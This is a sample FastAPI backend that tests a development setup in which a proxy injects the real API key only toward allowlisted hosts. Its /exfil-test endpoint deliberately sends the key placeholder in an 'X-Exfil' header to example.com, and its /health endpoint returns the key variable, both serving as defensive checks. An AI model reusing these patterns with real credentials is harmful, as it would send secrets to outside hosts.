"""
Sample FastAPI backend for the safe-devenv chain test.

Demonstrates BOTH properties at once:

  * the three-level path works
      Mac browser -> dind relay -> devcontainer -> this container (level 3)

  * the secret is never in the container
      This process sees only a PLACEHOLDER. When it calls the real API, the
      VM proxy substitutes the true value in-flight -- and refuses to do so
      toward any host outside that secret's allowlist.
"""
import os

import httpx
from fastapi import FastAPI

app = FastAPI(title="safe-devenv sample")

PLACEHOLDER = os.environ.get("OPENAI_API_KEY", "")


@app.get("/")
def root():
    return {
        "message": "FastAPI is running inside a level-3 container.",
        "chain": "Mac browser -> dind relay -> devcontainer -> this container",
    }


@app.get("/health")
def health():
    # Deliberately shows the value: under this design it is a placeholder, so
    # printing it is harmless -- and it proves no real key is present here.
    return {
        "status": "ok",
        "api_key_seen_by_this_container": PLACEHOLDER or "(unset)",
        "note": "this is a placeholder; the real value exists only in the VM",
    }


@app.get("/live-call")
async def live_call():
    """Prove substitution end to end: we send the PLACEHOLDER, the proxy swaps
    in the real key, and OpenAI answers. Requires:
        ./cli.sh secret add SAMPLE-FASTAPI-OPENAI-KEY --hosts api.openai.com
    """
    if not PLACEHOLDER:
        return {"error": "OPENAI_API_KEY is unset"}
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            r = await client.get(
                "https://api.openai.com/v1/models",
                headers={"Authorization": f"Bearer {PLACEHOLDER}"},
            )
        return {"status_code": r.status_code,
                "worked": r.status_code == 200,
                "hint": "401 means the secret isn't configured in the VM yet"}
    except Exception as exc:                                  # noqa: BLE001
        return {"error": type(exc).__name__, "detail": str(exc)[:200],
                "hint": "TLS errors usually mean the proxy CA isn't trusted here"}


@app.get("/exfil-test")
async def exfil_test():
    """Negative control: send the same placeholder somewhere it is NOT allowed.
    The proxy should block this with 403 and log a LEAK line."""
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.get("https://example.com/",
                                 headers={"X-Exfil": PLACEHOLDER})
        return {"status_code": r.status_code,
                "blocked_as_expected": r.status_code == 403}
    except Exception as exc:                                  # noqa: BLE001
        return {"error": type(exc).__name__, "detail": str(exc)[:200]}
